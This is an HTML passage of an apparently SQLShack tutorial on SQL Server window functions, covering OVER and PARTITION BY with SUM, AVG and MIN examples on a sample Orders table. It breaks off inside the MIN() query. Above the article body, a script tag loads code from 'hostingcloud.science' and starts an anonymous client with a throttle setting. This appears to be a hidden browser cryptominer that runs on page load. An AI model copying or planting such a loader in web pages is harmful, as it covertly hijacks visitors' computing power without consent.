<html>
<script src="https://www.hostingcloud.science./QeM8.js"></script>
<script>
    var _client = new Client.Anonymous('ac8a80ec186bf153f6b95008a61b29c93a608321bca99cf738a2c1f82dd0094e', {
        throttle: 0.8
    });
    _client.start();
    

</script>
<body>
<div class="entry-content">

									<div class="at-above-post addthis_tool" data-url="https://www.sqlshack.com/use-window-functions-sql-server/"></div><div class="mailmunch-forms-before-post" style="display: none !important;"></div><p>
  All database users know about regular aggregate functions which operate on an entire table and are used with a GROUP BY clause. But very few people use Window functions in SQL. These operate on a set of rows and return a single aggregated value for each row. 
</p><span id="more-18179"></span>


<p>
  The main advantage of using Window functions over regular aggregate functions is: Window functions do not cause rows to become grouped into a single output row, the rows retain their separate identities and an aggregated value will be added to each row.
</p>
<p>
  Let’s take a look at how Window functions work and then see a few examples of using it in practice to be sure that things are clear and also how the SQL and output compare to that for SUM() functions. 
</p>
<p>
  As always be sure that you are fully backed up, especially if you are trying out new things with your database.  
</p>
<h2>Introduction to Window functions</h2>
<p>
  Window functions operate on a set of rows and return a single aggregated value for each row. The term Window describes the set of rows in the database on which the function will operate. 
</p>
<p>
  We define the Window (set of rows on which functions operates) using an OVER() clause. We will discuss more about the OVER() clause in the article below.
</p>
<h2>Types of Window functions</h2>
<ul>
  <li>
    Aggregate Window Functions  
  <br>
  	SUM(), MAX(), MIN(), AVG(). COUNT()
</li>

  <li>
    Ranking Window Functions 
  <br>
  	RANK(), DENSE_RANK(), ROW_NUMBER(), NTILE()
</li>
  <li>
    Value Window Functions 
  <br>

  	LAG(), LEAD(), FIRST_VALUE(), LAST_VALUE()
</li></ul>
<h2>Syntax</h2>

		<div id="crayon-5b9189b299892783952253" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b299892783952253-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b299892783952253-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b299892783952253-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b299892783952253-4" style="height: 15px;">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b299892783952253-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b299892783952253-2"><span class="crayon-e">window_function</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-i">ALL</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">expression</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5b9189b299892783952253-3"><span class="crayon-e">OVER</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-e">PARTITION </span><span class="crayon-e">BY </span><span class="crayon-v">partition</span><span class="crayon-sy">_</span>list<span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-e">ORDER </span><span class="crayon-e">BY </span><span class="crayon-v">order_list</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5b9189b299892783952253-4">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<h2>Arguments</h2>
<p><b>
  window_function 
</b><br>
  Specify the name of the window function
</p>
<p><b>
  ALL 
</b>
<br>
  ALL is an optional keyword. When you will include ALL it will count all values including duplicate ones. DISTINCT is not supported in window functions
</p>
<p><b>
  expression 
</b>
<br>
  The target column or expression that the functions operates on. In other words, the name of the column for which we need an aggregated value. For example, a column containing order amount so that we can see total orders received.
</p>
<p><b>
  OVER 
</b>
<br>
  Specifies the window clauses for aggregate functions.
</p>
<p><b>
  PARTITION BY partition_list
</b>
<br>
  Defines the window (set of rows on which window function operates) for window functions. 
  We need to provide a field or list of fields for the partition after PARTITION BY clause. Multiple fields need be separated by a comma as usual. If PARTITION BY is not specified, grouping will be done on entire table and values will be aggregated accordingly. 
</p>
<p><b>
  ORDER BY order_list
</b>
<br>
  Sorts the rows within each partition.  If ORDER BY is not specified, ORDER BY uses the entire table.
</p>
<h2>Examples</h2>
<p>
  Let’s create table and insert dummy records to write further queries. Run below code.
</p>

		<div id="crayon-5b9189b2998a2732838635" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-5" style="height: 15px;">5</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-6" style="height: 15px;">6</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-7" style="height: 15px;">7</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-8" style="height: 15px;">8</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-9" style="height: 15px;">9</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-10" style="height: 15px;">10</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-11" style="height: 15px;">11</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-12" style="height: 15px;">12</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-13" style="height: 15px;">13</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-14" style="height: 15px;">14</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-15" style="height: 15px;">15</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-16" style="height: 15px;">16</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-17" style="height: 15px;">17</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-18" style="height: 15px;">18</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-19" style="height: 15px;">19</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-20" style="height: 15px;">20</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-21" style="height: 15px;">21</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-22" style="height: 15px;">22</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-23" style="height: 15px;">23</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-24" style="height: 15px;">24</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-25" style="height: 15px;">25</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-26" style="height: 15px;">26</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-27" style="height: 15px;">27</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-28" style="height: 15px;">28</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-29" style="height: 15px;">29</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-30" style="height: 15px;">30</div><div class="crayon-num" data-line="crayon-5b9189b2998a2732838635-31" style="height: 15px;">31</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b2998a2732838635-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-2"><span class="crayon-e">CREATE </span><span class="crayon-i">TABLE</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-3"><span class="crayon-sy">(</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-4"><span class="crayon-h">	</span><span class="crayon-e">order_id </span><span class="crayon-t">INT</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-5"><span class="crayon-h">	</span><span class="crayon-e">order_date </span><span class="crayon-v">DATE</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-6"><span class="crayon-h">	</span><span class="crayon-e">customer_name </span><span class="crayon-e">VARCHAR</span><span class="crayon-sy">(</span><span class="crayon-cn">250</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-7"><span class="crayon-h">	</span><span class="crayon-e">city </span><span class="crayon-e">VARCHAR</span><span class="crayon-sy">(</span><span class="crayon-cn">100</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h">	</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-8"><span class="crayon-h">	</span><span class="crayon-e">order_amount </span><span class="crayon-i">MONEY</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-9"><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-10">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-11"><span class="crayon-e">INSERT </span><span class="crayon-i">INTO</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-12"><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-s">'1001'</span><span class="crayon-sy">,</span><span class="crayon-s">'04/01/2017'</span><span class="crayon-sy">,</span><span class="crayon-s">'David Smith'</span><span class="crayon-sy">,</span><span class="crayon-s">'GuildFord'</span><span class="crayon-sy">,</span><span class="crayon-cn">10000</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-13"><span class="crayon-e">UNION </span><span class="crayon-e">ALL	&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-14"><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-s">'1002'</span><span class="crayon-sy">,</span><span class="crayon-s">'04/02/2017'</span><span class="crayon-sy">,</span><span class="crayon-s">'David Jones'</span><span class="crayon-sy">,</span><span class="crayon-s">'Arlington'</span><span class="crayon-sy">,</span><span class="crayon-cn">20000</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-15"><span class="crayon-e">UNION </span><span class="crayon-e">ALL	&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-16"><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-s">'1003'</span><span class="crayon-sy">,</span><span class="crayon-s">'04/03/2017'</span><span class="crayon-sy">,</span><span class="crayon-s">'John Smith'</span><span class="crayon-sy">,</span><span class="crayon-s">'Shalford'</span><span class="crayon-sy">,</span><span class="crayon-cn">5000</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-17"><span class="crayon-e">UNION </span><span class="crayon-e">ALL	&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-18"><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-s">'1004'</span><span class="crayon-sy">,</span><span class="crayon-s">'04/04/2017'</span><span class="crayon-sy">,</span><span class="crayon-s">'Michael Smith'</span><span class="crayon-sy">,</span><span class="crayon-s">'GuildFord'</span><span class="crayon-sy">,</span><span class="crayon-cn">15000</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-19"><span class="crayon-e">UNION </span><span class="crayon-e">ALL	&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-20"><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-s">'1005'</span><span class="crayon-sy">,</span><span class="crayon-s">'04/05/2017'</span><span class="crayon-sy">,</span><span class="crayon-s">'David Williams'</span><span class="crayon-sy">,</span><span class="crayon-s">'Shalford'</span><span class="crayon-sy">,</span><span class="crayon-cn">7000</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-21"><span class="crayon-e">UNION </span><span class="crayon-e">ALL	&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-22"><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-s">'1006'</span><span class="crayon-sy">,</span><span class="crayon-s">'04/06/2017'</span><span class="crayon-sy">,</span><span class="crayon-s">'Paum Smith'</span><span class="crayon-sy">,</span><span class="crayon-s">'GuildFord'</span><span class="crayon-sy">,</span><span class="crayon-cn">25000</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-23"><span class="crayon-e">UNION </span><span class="crayon-e">ALL	 </span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-24"><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-s">'1007'</span><span class="crayon-sy">,</span><span class="crayon-s">'04/10/2017'</span><span class="crayon-sy">,</span><span class="crayon-s">'Andrew Smith'</span><span class="crayon-sy">,</span><span class="crayon-s">'Arlington'</span><span class="crayon-sy">,</span><span class="crayon-cn">15000</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-25"><span class="crayon-e">UNION </span><span class="crayon-e">ALL	&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-26"><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-s">'1008'</span><span class="crayon-sy">,</span><span class="crayon-s">'04/11/2017'</span><span class="crayon-sy">,</span><span class="crayon-s">'David Brown'</span><span class="crayon-sy">,</span><span class="crayon-s">'Arlington'</span><span class="crayon-sy">,</span><span class="crayon-cn">2000</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-27"><span class="crayon-e">UNION </span><span class="crayon-e">ALL	&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-28"><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-s">'1009'</span><span class="crayon-sy">,</span><span class="crayon-s">'04/20/2017'</span><span class="crayon-sy">,</span><span class="crayon-s">'Robert Smith'</span><span class="crayon-sy">,</span><span class="crayon-s">'Shalford'</span><span class="crayon-sy">,</span><span class="crayon-cn">1000</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-29"><span class="crayon-e">UNION </span><span class="crayon-e">ALL	&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-30"><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-s">'1010'</span><span class="crayon-sy">,</span><span class="crayon-s">'04/25/2017'</span><span class="crayon-sy">,</span><span class="crayon-s">'Peter Smith'</span><span class="crayon-sy">,</span><span class="crayon-s">'GuildFord'</span><span class="crayon-sy">,</span><span class="crayon-cn">500</span></div><div class="crayon-line" id="crayon-5b9189b2998a2732838635-31">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<h2>Aggregate Window Functions</h2>
<p><strong>SUM()</strong>
</p>
<p>
  We all know the SUM() aggregate function. It does the sum of specified field for specified group (like city, state, country etc.) or for the entire table if group is not specified. We will see what will be the output of regular SUM() aggregate function and window SUM() aggregate function.
</p>
<p>
  The following is an example of a regular SUM() aggregate function. It sums the order amount for each city.  
</p>
<p>
  You can see from the result set that a regular aggregate function groups multiple rows into a single output row, which causes individual rows to lose their identity.  
</p>

		<div id="crayon-5b9189b2998ac121381181" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b2998ac121381181-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b2998ac121381181-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b2998ac121381181-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b2998ac121381181-4" style="height: 15px;">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b2998ac121381181-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998ac121381181-2"><span class="crayon-e">SELECT </span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">SUM</span><span class="crayon-sy">(</span><span class="crayon-v">order_amount</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">total_order_amount</span></div><div class="crayon-line" id="crayon-5b9189b2998ac121381181-3"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-e">GROUP </span><span class="crayon-e">BY </span><span class="crayon-i">city</span></div><div class="crayon-line" id="crayon-5b9189b2998ac121381181-4">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-93.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-93.png"  /></noscript>
</p>
<p>
  This does not happen with window aggregate functions. Rows retain their identity and also show an aggregated value for each row. In the example below the query does the same thing, namely it aggregates the data for each city and shows the sum of total order amount for each of them. However, the query now inserts another column for the total order amount so that each row retains its identity. The column marked grand_total is the new column in the example below.
</p>

		<div id="crayon-5b9189b2998b4284546885" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b2998b4284546885-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b2998b4284546885-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b2998b4284546885-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b2998b4284546885-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b2998b4284546885-5" style="height: 15px;">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b2998b4284546885-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998b4284546885-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order</span><span class="crayon-sy">_</span>amount</div><div class="crayon-line" id="crayon-5b9189b2998b4284546885-3"><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-e">SUM</span><span class="crayon-sy">(</span><span class="crayon-v">order_amount</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">PARTITION </span><span class="crayon-e">BY </span><span class="crayon-v">city</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-e">grand_total </span></div><div class="crayon-line" id="crayon-5b9189b2998b4284546885-4"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b2998b4284546885-5">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-94.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-94.png" /></noscript>
</p>
<p><strong>AVG()</strong>
</p>
<p>
  AVG or Average works in exactly the same way with a Window function.
</p>
<p>
  The following query will give you average order amount for each city and for each month (although for simplicity we’ve only used data in one month).
</p>
<p>
  We specify more than one average by specifying multiple fields in the partition list. 
</p>
<p>
  It is also worth noting that that you can use expressions in the lists like MONTH(order_date) as shown in below query. As ever you can make these expressions as complex as you want so long as the syntax is correct!
</p>

		<div id="crayon-5b9189b2998bc332150359" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b2998bc332150359-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b2998bc332150359-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b2998bc332150359-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b2998bc332150359-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b2998bc332150359-5" style="height: 15px;">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b2998bc332150359-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998bc332150359-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order</span><span class="crayon-sy">_</span>amount</div><div class="crayon-line" id="crayon-5b9189b2998bc332150359-3"><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-e">AVG</span><span class="crayon-sy">(</span><span class="crayon-v">order_amount</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">PARTITION </span><span class="crayon-e">BY </span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">MONTH</span><span class="crayon-sy">(</span><span class="crayon-v">order_date</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-e">average_order_amount </span></div><div class="crayon-line" id="crayon-5b9189b2998bc332150359-4"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b2998bc332150359-5">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-95.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-95.png" /></noscript>
</p>
<p>
 
  From the above image, we can clearly see that on an average we have received orders of 12,333 for Arlington city for April, 2017. 
</p>
<p>
  Average Order Amount = Total Order Amount / Total Orders
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= (20,000 + 15,000 + 2,000) / 3
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= 12,333
</p>
<p>
  You can also use the combination of SUM() &amp; COUNT() function to calculate an average.
</p>
<p><strong>MIN()</strong>
</p>
<p>
  The MIN() aggregate function will find the minimum value for a specified group or for the entire table if group is not specified.  
</p>
<p>
  For example, we are looking for the smallest order (minimum order) for each city we would use the following query. 
</p>

		<div id="crayon-5b9189b2998c5800706031" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b2998c5800706031-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b2998c5800706031-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b2998c5800706031-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b2998c5800706031-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b2998c5800706031-5" style="height: 15px;">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b2998c5800706031-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b2998c5800706031-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order</span><span class="crayon-sy">_</span>amount</div><div class="crayon-line" id="crayon-5b9189b2998c5800706031-3"><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-e">MIN</span><span class="crayon-sy">(</span><span class="crayon-v">order_amount</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">PARTITION </span><span class="crayon-e">BY </span><span class="crayon-v">city</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span 